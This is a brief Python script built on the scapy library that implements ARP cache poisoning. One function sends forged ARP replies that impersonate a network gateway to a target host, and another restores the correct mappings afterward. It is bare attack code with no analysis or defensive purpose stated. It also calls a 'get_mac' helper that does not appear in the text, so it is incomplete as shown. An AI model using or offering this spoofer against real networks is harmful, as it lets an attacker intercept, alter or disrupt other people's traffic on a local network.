#!/usr/bin/env python

import scapy.all as scapy


def connect(target_ip, gateway_ip, target_mac):
    packet = scapy.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, psrc=source_ip, pdst=destination_ip, hwdst=destination_mac, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
